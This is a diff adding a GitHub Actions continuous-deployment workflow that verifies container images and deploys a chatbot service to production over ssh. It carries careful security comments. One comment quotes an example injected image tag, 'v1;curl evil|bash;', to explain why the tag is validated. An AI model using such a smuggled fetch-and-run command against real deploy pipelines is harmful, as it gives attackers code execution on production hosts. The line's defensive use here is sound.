@@ -1,0 +1,272 @@
+name: CD
+
+on:
+  # Merging the release PR is the deploy decision.
+  #
+  # Each component repo's sync-to-meta workflow accumulates its submodule
+  # pointer bump on a bot-owned release/next branch and collects them into a
+  # single PR into main. So a commit on main always carries a coherent set of
+  # pointers, and deploying every one of them is correct. Without that
+  # batching each component merge would push its own bump straight to main and
+  # each one would deploy -- the first of any two deploying a mismatched pair.
+  #
+  # See docs/superpowers/specs/2026-09-03-infrastructure-pipeline-design.md §5.1.
+  push:
+    branches: [main]
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: 'Docker image tag to deploy (defaults to commit SHA)'
+        required: false
+        type: string
+      skip_backup:
+        description: 'Skip database backup before deployment'
+        required: false
+        type: boolean
+        default: false
+      dry_run:
+        description: 'Dry run - pull images but do not deploy'
+        required: false
+        type: boolean
+        default: false
+
+# Least privilege by default; jobs that need more say so.
+permissions:
+  contents: read
+
+env:
+  REGISTRY: ghcr.io
+  # Must be lowercase for the Docker registry.
+  IMAGE_PREFIX: etqan-agency/chatbot
+
+jobs:
+  wait-for-ci:
+    name: Wait for CI
+    runs-on: ubuntu-latest
+    if: github.event_name == 'push'
+    permissions:
+      checks: read
+    steps:
+      - name: Wait for CI workflow
+        # Pinned to a full commit SHA, not the movable `v1.2.0` tag: this is the
+        # only gate between a red CI run and a production deploy, and a tag can
+        # be repointed at any commit by whoever controls that repository.
+        uses: fountainhead/action-wait-for-check@5a908a24814494009c4bb27c242ea38c93c593be # v1.2.0
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+          checkName: 'CI Summary'
+          ref: ${{ github.sha }}
+          timeoutSeconds: 2400
+          intervalSeconds: 30
+
+  verify-images:
+    name: Verify Images
+    runs-on: ubuntu-latest
+    needs: [wait-for-ci]
+    if: always() && (needs.wait-for-ci.result == 'success' || needs.wait-for-ci.result == 'skipped')
+    permissions:
+      packages: read
+    outputs:
+      image_tag: ${{ steps.tag.outputs.tag }}
+    steps:
+      - name: Set image tag
+        id: tag
+        env:
+          INPUT_TAG: ${{ github.event.inputs.image_tag }}
+          SHA: ${{ github.sha }}
+        run: |
+          if [[ -n "${INPUT_TAG}" ]]; then
+            # Validate before this value goes anywhere near an ssh argument.
+            #
+            # Routing the input through env: protects the RUNNER's shell, but
+            # the deploy step splices the tag into a string that ssh executes
+            # remotely as `bash -c "<string>"`. Unvalidated, a tag of
+            # `v1;curl evil|bash;` is arbitrary code execution on the
+            # production host as the deploy user, reached before deploy.sh's
+            # own argument parser ever sees it.
+            #
+            # This allowlist is a subset of what Docker permits, which is all
+            # we ever produce: a 40-char commit SHA, or `latest`.
+            if [[ ! "${INPUT_TAG}" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then
+              echo "ERROR: refusing image tag '${INPUT_TAG}' -- it must match" >&2
+              echo "       ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$" >&2
+              exit 1
+            fi
+            echo "tag=${INPUT_TAG}" >> "$GITHUB_OUTPUT"
+          else
+            echo "tag=${SHA}" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Log in to Container Registry
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Verify both images exist
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
+        run: |
+          IMAGES=(
+            "${REGISTRY}/${IMAGE_PREFIX}/api:${TAG}"
+            "${REGISTRY}/${IMAGE_PREFIX}/dashboard:${TAG}"
+          )
+          for IMAGE in "${IMAGES[@]}"; do
+            echo "Verifying: ${IMAGE}"
+            docker manifest inspect "${IMAGE}" > /dev/null || {
+              echo "ERROR: Image not found: ${IMAGE}"
+              exit 1
+            }
+            echo "OK: ${IMAGE}"
+          done
+          echo "Both images verified."
+
+  deploy:
+    name: Deploy to Production
+    needs: [verify-images]
+    # wait-for-ci is skipped on workflow_dispatch (it is push-only), and Actions
+    # propagates a skip transitively through `needs`. verify-images guards
+    # against that with always(); without the same guard here, deploy inherits
+    # the skip, deploys nothing, and the whole run reports SUCCESS.
+    #
+    # There is deliberately no `rollback` input here. Rollback lives in its own
+    # workflow (.github/workflows/rollback.yml). In the reference implementation
+    # a `rollback: true` input on CD skipped this job -- which made the run
+    # green -- and rolled nothing back: an operator reaching for rollback under
+    # pressure got a green tick and no action.
+    if: always() && needs.verify-images.result == 'success'
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://app.${{ vars.DOMAIN }}
+    concurrency:
+      group: deploy-production
+      cancel-in-progress: false
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Configure SSH
+        env:
+          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+          SSH_KNOWN_HOSTS: ${{ secrets.SSH_KNOWN_HOSTS }}
+        run: |
+          mkdir -p ~/.ssh
+          printf '%s\n' "${SSH_PRIVATE_KEY}" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+          printf '%s\n' "${SSH_KNOWN_HOSTS}" > ~/.ssh/known_hosts
+          chmod 644 ~/.ssh/known_hosts
+
+      - name: Sync deployment files
+        env:
+          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
+        run: |
+          SSH_CMD="ssh -i ~/.ssh/deploy_key"
+          scp -i ~/.ssh/deploy_key docker-compose.production.yml \
+            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/"
+          # --delete: providers.file.directory loads every file under
+          # traefik/dynamic/, so a middleware file deleted or renamed in the
+          # repo must also disappear on the server or its config stays live
+          # indefinitely. Safe: ACME state and access logs live in the
+          # traefik_acme and traefik_logs volumes, not under traefik/, so
+          # nothing server-generated lives in the synced tree.
+          rsync -avz --delete -e "${SSH_CMD}" traefik/ \
+            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/traefik/"
+          rsync -avz --delete -e "${SSH_CMD}" scripts/ \
+            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/scripts/"
+          # media/nginx.conf is a BIND MOUNT in docker-compose.production.yml.
+          # Omitting it from the sync means the media container mounts whatever
+          # happens to be on the server -- or fails to start if nothing is.
+          rsync -avz --delete -e "${SSH_CMD}" media/ \
+            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/media/"
+
+      - name: Deploy
+        env:
+          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
+          IMAGE_TAG: ${{ needs.verify-images.outputs.image_tag }}
+          GHCR_TOKEN: ${{ secrets.GHCR_PAT }}
+          SKIP_BACKUP: ${{ github.event.inputs.skip_backup || 'false' }}
+          DRY_RUN: ${{ github.event.inputs.dry_run || 'false' }}
+        run: |
+          EXTRA_ARGS=""
+          [ "${SKIP_BACKUP}" = "true" ] && EXTRA_ARGS="${EXTRA_ARGS} --skip-backup"
+          [ "${DRY_RUN}" = "true" ] && EXTRA_ARGS="${EXTRA_ARGS} --dry-run"
+
+          # Two ssh calls on purpose. ssh runs its command argument remotely as
+          # `bash -c "<the whole string>"`, so a token embedded in that string
+          # is visible in the server's process table for the life of the
+          # deploy. The login therefore gets its own invocation with the token
+          # piped on STDIN and never in argv.
+          printf '%s' "${GHCR_TOKEN}" | ssh -i ~/.ssh/deploy_key \
+            "${DEPLOY_USER}@${DEPLOY_HOST}" \
+            "docker login ghcr.io -u x-access-token --password-stdin"
+
+          # The deploy itself keeps < /dev/null: deploy.sh runs commands that
+          # read stdin, and without this they would consume the ssh channel and
+          # the script would silently truncate while reporting success.
+          ssh -i ~/.ssh/deploy_key "${DEPLOY_USER}@${DEPLOY_HOST}" \
+            "cd ${DEPLOY_PATH} && bash scripts/deploy.sh ${IMAGE_TAG} ${EXTRA_ARGS}" < /dev/null
+
+      - name: Deployment summary
+        if: success()
+        env:
+          TAG: ${{ needs.verify-images.outputs.image_tag }}
+          DOMAIN: ${{ vars.DOMAIN }}
+          # Routed through env: like every other interpolation in this file,
+          # rather than spliced into the run: block. github.actor is not
+          # attacker-controlled here, but "no ${{ }} inside a run: body" is a
+          # rule that only works if it has no exceptions to argue about.
+          ACTOR: ${{ github.actor }}
+        run: |
+          {
+            echo "## Deployment Successful"
+            echo ""
+            echo "| Service | URL |"
+            echo "|---------|-----|"
+            echo "| Dashboard | https://app.${DOMAIN} |"
+            echo "| API | https://api.${DOMAIN} |"
+            echo ""
+            echo "**Image Tag:** \`${TAG}\`"
+            echo "**Triggered by:** ${ACTOR}"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Failure guidance
+        if: failure()
+        run: |
+          {
+            echo "## Deployment FAILED"
+            echo ""
+            echo "deploy.sh auto-rolls-back when the SMOKE CHECKS fail, to CURRENT"
+            echo "from .release-state -- the tag that was serving before this run"
+            echo "(the file is not rewritten until smoke passes)."
+            echo "If it failed BEFORE the smoke checks -- preflight, migrate, a roll"
+            echo "that timed out -- nothing was rolled back and nothing was healed."
+            echo ""
+            echo "### Rollback after a failure BEFORE the smoke checks"
+            echo ""
+            echo "\`.release-state\` has NOT been advanced, so its \`CURRENT\` still names"
+            echo "the release that was serving before this run started."
+            echo ""
+            echo "1. On the server: \`cat \${DEPLOY_PATH}/.release-state\`"
+            echo "2. Actions -> **Rollback** -> Run workflow"
+            echo "3. Enter the tag named by **CURRENT**."
+            echo ""
+            echo "Do **not** leave the tag blank here. Blank means PREVIOUS, which in"
+            echo "this state is release N-2 -- and \`migrate\` may already have applied"
+            echo "release N's schema. Expand/contract only guarantees compatibility"
+            echo "ONE release back, so N-2 code on N schema is exactly the breakage"
+            echo "the pipeline exists to prevent."
+            echo ""
+            echo "### Rollback after a SUCCESSFUL deploy that turned out bad"
+            echo ""
+            echo "\`.release-state\` has been advanced, so \`PREVIOUS\` is correct:"
+            echo "leave the tag blank, or enter a specific known-good tag."
+            echo ""
+            echo "Do NOT re-run CD with an older tag: that is a *deploy* of that tag"
+            echo "(collectstatic, migrate, release-state bookkeeping), not a rollback."
+          } >> "$GITHUB_STEP_SUMMARY"
